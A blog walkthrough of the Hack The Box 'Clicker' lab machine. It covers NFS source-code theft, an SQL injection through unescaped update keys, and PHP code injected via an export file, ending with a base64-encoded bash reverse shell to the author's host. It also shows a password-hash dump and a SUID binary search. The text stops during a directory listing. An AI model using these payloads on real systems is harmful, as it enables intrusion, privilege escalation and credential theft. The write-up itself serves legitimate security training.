---
layout: post
title: Hack The Box Walkthrough - Clicker
date: 2024-01-27
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2024/01/HTB/Clicker
img: 2024/01/Clicker/Clicker.png
---

This was a really fun box. I had to get the source code of a web application through NFS. Then I was able to abuse multiple vulnerabilities in the application to get a shell on the server. Once on the server, I exploited a suid application to get a user, and a badly configured sudo to finally get root.

* Room: Clicker
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Clicker](https://app.hackthebox.com/machines/Clicker)
* Author: [Nooneye](https://app.hackthebox.com/users/166251)

## Enumeration

I started the box by running RustScan to find open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.65.239:22
Open 10.129.65.239:80
Open 10.129.65.239:111
Open 10.129.65.239:2049
Open 10.129.65.239:42381
Open 10.129.65.239:42899
Open 10.129.65.239:45251
Open 10.129.65.239:48541
Open 10.129.65.239:57299
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-11 16:13 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.

...

NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Nmap scan report for target (10.129.65.239)
Host is up, received user-set (0.052s latency).
Scanned at 2023-11-11 16:13:40 EST for 7s

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO8nDXVOrF/vxCNHYMVULY8wShEwVH5Hy3Bs9s9o/WCwsV52AV5K8pMvcQ9E7JzxrXkUOgIV4I+8hI0iNLGXTVY=
|   256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjDCjag/Rh72Z4zXCLADSXbGjSPTH8LtkbgATATvbzv
80/tcp    open  http     syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34649/udp   mountd
|   100005  1,2,3      38363/udp6  mountd
|   100005  1,2,3      42381/tcp   mountd
|   100005  1,2,3      53575/tcp6  mountd
|   100021  1,3,4      37898/udp   nlockmgr
|   100021  1,3,4      39869/tcp6  nlockmgr
|   100021  1,3,4      42899/tcp   nlockmgr
|   100021  1,3,4      53983/udp6  nlockmgr
|   100024  1          38085/tcp6  status
|   100024  1          48541/tcp   status
|   100024  1          57467/udp6  status
|   100024  1          60173/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
42381/tcp open  mountd   syn-ack 1-3 (RPC #100005)
42899/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
45251/tcp open  mountd   syn-ack 1-3 (RPC #100005)
48541/tcp open  status   syn-ack 1 (RPC #100024)
57299/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
```

This box had nine open ports. It had the habitual SSH and HTTP ports open. But seven more that seemed to be pointing to RPC (Remote Procedure Call).

Port 80 was redirecting to 'clicker.htb', so I added that to my hosts file and checked for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 0 -H "Host:FUZZ.clicker.htb" "http://clicker.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://clicker.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   400        10 L     35 W       301 Ch      "*"
000319756:   400        10 L     35 W       301 Ch      "#mail"
000415924:   400        10 L     35 W       301 Ch      "#pop3"
000488839:   400        10 L     35 W       301 Ch      "#smtp"
000588825:   200        107 L    277 W      2984 Ch     "www"
000588822:   400        10 L     35 W       301 Ch      "#www"

Total time: 1186.905
Processed Requests: 648201
Filtered Requests: 648195
Requests/sec.: 546.1268
```

It did not find anything.

## Website

I launched a browser and started looking at the website.

![Website](/assets/images/2024/01/Clicker/Website.png "Website")

It was a site for a game. I tried login in with simple credentials, and basic injections, that did not work. There was a register link. I tried to create a user called 'admin'.

![Admin User Exists](/assets/images/2024/01/Clicker/AdminUserExists.png "Admin User Exists")

It told me that admin already existed in the application. I knew I could try to brute force their password if I did not find anything else. I created a user and logged in.

I tried playing the game.

![The Game](/assets/images/2024/01/Clicker/TheGame.png "The Game")

The game consisted of clicking until you got enough point to level up. Very exciting!

When I clicked on the save button, I saw that my points and level were passed in the URL.

```http
GET /save_game.php?clicks=26&level=1 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=qreneo6dl74qicu33bq4jv1o5l
Upgrade-Insecure-Requests: 1
```

I could easily cheat by sending bigger values.

```http
GET /save_game.php?clicks=1000000&level=1000000 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=qreneo6dl74qicu33bq4jv1o5l
Upgrade-Insecure-Requests: 1
```

I looked at my profile, and I had one million points.

![Profile](/assets/images/2024/01/Clicker/ProfileInfo.png "Profile")

The game was easy to cheat, but it didn't give me anything. I launched Feroxbuster to look for hidden pages.

```bash
$ feroxbuster -u http://clicker.htb -o ferox.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://clicker.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      114l      266w     3221c http://clicker.htb/login.php
200      GET       50l       98w      733c http://clicker.htb/assets/cover.css
200      GET      114l      266w     3253c http://clicker.htb/register.php
200      GET      127l      319w     3343c http://clicker.htb/info.php
302      GET        0l        0w        0c http://clicker.htb/logout.php => http://clicker.htb/index.php
302      GET        0l        0w        0c http://clicker.htb/profile.php => http://clicker.htb/index.php
200      GET     5668l    32838w  2838184c http://clicker.htb/assets/background.png
301      GET        9l       28w      311c http://clicker.htb/assets => http://clicker.htb/assets/
200      GET      107l      277w     2984c http://clicker.htb/index.php
302      GET        0l        0w        0c http://clicker.htb/export.php => http://clicker.htb/index.php
200      GET      107l      277w     2984c http://clicker.htb/
200      GET        0l        0w        0c http://clicker.htb/create_player.php
302      GET        0l        0w        0c http://clicker.htb/admin.php => http://clicker.htb/index.php
200      GET        7l     1966w   155758c http://clicker.htb/assets/css/bootstrap.min.css
302      GET        0l        0w        0c http://clicker.htb/play.php => http://clicker.htb/index.php
200      GET        0l        0w        0c http://clicker.htb/authenticate.php
301      GET        9l       28w      314c http://clicker.htb/assets/js => http://clicker.htb/assets/js/
301      GET        9l       28w      312c http://clicker.htb/exports => http://clicker.htb/exports/
301      GET        9l       28w      315c http://clicker.htb/assets/css => http://clicker.htb/assets/css/
401      GET        0l        0w        0c http://clicker.htb/diagnostic.php
[####################] - 7m    598027/598027  0s      found:20      errors:57
[####################] - 7m    119601/119601  294/s   http://clicker.htb/
[####################] - 7m    119601/119601  296/s   http://clicker.htb/assets/
[####################] - 7m    119601/119601  297/s   http://clicker.htb/assets/js/
[####################] - 7m    119601/119601  297/s   http://clicker.htb/assets/css/
[####################] - 7m    119601/119601  296/s   http://clicker.htb/exports/
```

It found a few interesting pages. It looked like the application had admin features. I also saw some export and diagnostic pages. When I tried them, I was redirected to the index page. I probably needed an administrator user to access them.

## RPC / NFS

After I was done with a first pass on the web application, I started looking at the other ports. nmap identified port 111 as RPCBind. The other ports appeared to be related to it. Most likely services exposed by RPC.

I looked on [HackTrics](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind) for how to use RPCBind.

```bash
$ rpcinfo clicker.htb
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.141.250        mountd     superuser
    100005    1    tcp       0.0.0.0.223.211        mountd     superuser
    100005    1    udp6      ::.208.221             mountd     superuser
    100005    1    tcp6      ::.148.113             mountd     superuser
    100005    2    udp       0.0.0.0.207.7          mountd     superuser
    100005    2    tcp       0.0.0.0.176.195        mountd     superuser
    100005    2    udp6      ::.185.18              mountd     superuser
    100005    2    tcp6      ::.234.63              mountd     superuser
    100005    3    udp       0.0.0.0.135.89         mountd     superuser
    100005    3    tcp       0.0.0.0.165.141        mountd     superuser
    100005    3    udp6      ::.149.219             mountd     superuser
    100024    1    udp       0.0.0.0.235.13         status     116
    100024    1    tcp       0.0.0.0.189.157        status     116
    100024    1    udp6      ::.224.123             status     116
    100024    1    tcp6      ::.148.197             status     116
    100005    3    tcp6      ::.209.71              mountd     superuser
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 nfs_acl    superuser
    100021    1    udp       0.0.0.0.148.10         nlockmgr   superuser
    100021    3    udp       0.0.0.0.148.10         nlockmgr   superuser
    100021    4    udp       0.0.0.0.148.10         nlockmgr   superuser
    100021    1    tcp       0.0.0.0.167.147        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.167.147        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.167.147        nlockmgr   superuser
    100021    1    udp6      ::.210.223             nlockmgr   superuser
    100021    3    udp6      ::.210.223             nlockmgr   superuser
    100021    4    udp6      ::.210.223             nlockmgr   superuser
    100021    1    tcp6      ::.155.189             nlockmgr   superuser
    100021    3    tcp6      ::.155.189             nlockmgr   superuser
    100021    4    tcp6      ::.155.189             nlockmgr   superuser
```

`rpcinfo` gave me similar information to what nmap had already given me. It confirmed that [NFS](https://en.wikipedia.org/wiki/Network_File_System) (Network File System) was available. HackTricks had a [page dedicated to exploiting NFS](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting).


I looked at the exposed mount, and mounted it to my machine.

```bash
$ showmount -e target
Export list for target:
/mnt/backups *

$ mkdir /tmp/mnt

$ sudo mount -t nfs target:/mnt/backups /tmp/mnt

$ ls /tmp/mnt
clicker.htb_backup.zip
```

It contained a single file. It was a backup of the source code for the application. I decompressed the files and started analyzing the code.

## Becoming an Admin

While looking through the code, I saw that most database interactions were done in a file called 'db_utils.php'. This file was using prepared statements on all queries.

However, one function was building a query with unsafe user data.

```php
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

The `save_profile` function was used when saving the results of a game.

It built a query like this one to update the profile.

```sql
UPDATE players SET click='2',level='3' WHERE username = 'eric'
```

It did not validate what the keys were. From other functions in the code, I knew there was a `role` column that I could set to 'Admin'. I tried using it to set my user to Admin.

```http
GET /save_game.php?clicks=0&level=0&role=Admin HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=qreneo6dl74qicu33bq4jv1o5l
Upgrade-Insecure-Requests: 1
```

It got rejected.

```http
HTTP/1.1 302 Found
Date: Sun, 12 Nov 2023 20:34:40 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /index.php?err=Malicious activity detected!
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

I looked at the code that called this function. There was some validation around the column names.

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
}
?>
```

I could not use `role` as a key. But I look back at the code that built the query.

```php
$setStr .= $key . "=" . $pdo->quote($value) . ",";
```

The value was escaped, but not the key. So I could build a key that contains some SQL injection. If I sent this key:

```
role='Admin',nickname
```

It would end up with a query like this one.

```sql
UPDATE players SET click='2',level='3',role='Admin',nickname='Pwn' WHERE username = :player
```

I had to make sure the equal sign was escaped correctly.

```http
GET /save_game.php?clicks=2&level=3&role%3d'Admin',nickname=Pwn HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=qreneo6dl74qicu33bq4jv1o5l
Upgrade-Insecure-Requests: 1
```

After sending that request, I reconnected to the application to refresh the session. And I was admin.

![Administration Portal](/assets/images/2024/01/Clicker/Admin.png "Administration Portal")

### Remote Code Execution

Once I was an administrator, I tried accessing the diagnostic page. I got a 401 Unautorized. I needed to provide a token to access it.

```php
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
	}
}
else {
    header("HTTP/1.1 401 Unauthorized");
    die;
}
```

I failed to crack the hash with hashcat, so I could not access this page yet.

I looked at the export functionality.

```php
$threshold = 1000000;
if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
    $threshold = $_POST["threshold"];
}
$data = get_top_players($threshold);
$currentplayer = get_current_player($_SESSION["PLAYER"]);
$s = "";
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>';
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
}

$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);
```

It saved the top players information in a file in the exports folder. I could request different file extensions. It formatted the output differently for txt and json files. Every other extensions would export html. And there was no validation around the extensions. So I could request a PHP file and control what would end up in it by setting the nickname of my user.

I tried setting my nickname to some simple PHP code to test it.

```php
GET /save_game.php?clicks=20000000&level=30000000&nickname=%3C%3Fphp%20echo%20%27IN%27%3B%3F%3E HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=9nj0jaelkdd97jpn2llqe0ts11
Upgrade-Insecure-Requests: 1
```

Then I called the export endpoint, requesting a PHP file.

```http
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://clicker.htb
Connection: keep-alive
Referer: http://clicker.htb/admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_svgyuuzq.json
Cookie: PHPSESSID=9nj0jaelkdd97jpn2llqe0ts11
Upgrade-Insecure-Requests: 1
Content-Length: 31

threshold=1000000&extension=php
```

I looked at the exported file. My PHP code was executed since my nickname was simply 'IN'.

![RCE](/assets/images/2024/01/Clicker/RCE.png "RCE")

With this, I could build a reverse shell. I started by encoding the reverse shell code in base64.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.59/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTkvNDQ0NCAwPiYxICAK
```

Then I created PHP code that would execute it.

```php
<?php `echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTkvNDQ0NCAwPiYxICAK|base64 -d|bash`;?>
```

I URL encoded the PHP code with [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=PD9waHAgYGVjaG8gLW4gWW1GemFDQWdMV2tnUGlZZ0wyUmxkaTkwWTNBdk1UQXVNVEF1TVRRdU5Ua3ZORFEwTkNBd1BpWXhJQ0FLfGJhc2U2NCAtZHxiYXNoYDs/Pg) and used that as my nickname.

```http
GET /save_game.php?clicks=20000000&level=30000000&nickname=%3C%3Fphp%20%60echo%20%2Dn%20YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTkvNDQ0NCAwPiYxICAK%7Cbase64%20%2Dd%7Cbash%60%3B%3F%3E HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=4v4qtarbee22g999t7te4dqo1p
Upgrade-Insecure-Requests: 1
```

I exported the players as PHP again. When I accessed the exported file, I got a shell.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.65.239] 52494
bash: cannot set terminal process group (1216): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$
```

## User Jack

I had database credentials. So once on the server, I connected to the DB to see what I could find in it.

```sql
www-data@clicker:/var/www/clicker.htb$ mysql -u clicker_db_user -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 238
Server version: 8.0.34-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| clicker            |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use clicker;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show Tables;
+-------------------+
| Tables_in_clicker |
+-------------------+
| players           |
+-------------------+
1 row in set (0.00 sec)

mysql> Select * From players;
+---------------+------------------------------------------------------------------------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
| username      | nickname                                                                                       | password                                                         | role  | clicks             | level     |
+---------------+------------------------------------------------------------------------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
| admin         | admin                                                                                          | ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82 | Admin | 999999999999999999 | 999999999 |
| ButtonLover99 | ButtonLover99                                                                                  | 55d1d58e17361fe78a61a96847b0e0226a0bc1a4e38a7b167c10b5cf513ca81f | User  |           10000000 |       100 |
| eric          | <?php `echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTkvNDQ0NCAwPiYxICAK|base64 -d|bash`;?> | 6f9edcd3408cbda14a837e6a44fc5b7f64ccc9a2477c1498fcb13c777ffb9605 | Admin |           20000000 |  30000000 |
| Paol          | Paol                                                                                           | bff439c136463a07dac48e50b31a322a4538d1fac26bfb5fd3c48f57a17dabd3 | User  |            2776354 |        75 |
| Th3Br0        | Th3Br0                                                                                         | 3185684ff9fd84f65a6c3037c3214ff4ebdd0e205b6acea97136d23407940c01 | User  |           87947322 |         1 |
+---------------+------------------------------------------------------------------------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
5 rows in set (0.00 sec)
```

I had password hashes for a few users. I saved them to a file and tried to crack them.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt --username -m 1400
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2865/5794 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

...

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

6f9edcd3408cbda14a837e6a44fc5b7f64ccc9a2477c1498fcb13c777ffb9605:eric
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: hash.txt
Time.Started.....: Sat Nov 11 17:28:09 2023 (4 secs)
Time.Estimated...: Sat Nov 11 17:28:13 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3953.7 kH/s (0.30ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/5 (20.00%) Digests (total), 1/5 (20.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217365786d652121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 48%

Started: Sat Nov 11 17:28:07 2023
Stopped: Sat Nov 11 17:28:14 2023
```

It quickly found my very secure password. But nothing else.

I looked for suid binaries.

```bash
www-data@clicker:/var/www/clicker.htb$ find / -perm /u=s 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query

www-data@clicker:/var/www/clicker.htb$ file /opt/manage/execute_query
/opt/manage/execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
```

The `execute_query` file stood out. I looked in the folder where it was located. There was a README file explaining how to use it.

```bash
www-data@clicker:/var/www/clicker.htb$ ls -la /opt/manage/
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21 22:29 .
drwxr-xr-x 3 root root  4096 Jul 20 10:00 ..
-rw-rw-r-- 1 jack jack   256 Jul 21 22:29 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
www-data@clicker:/var/www/clicker.htb$ ls -la /opt/manage/README.txt
-rw-rw-r-- 1 jack jack 256 Jul 21 22:29 /opt/manage/README.txt
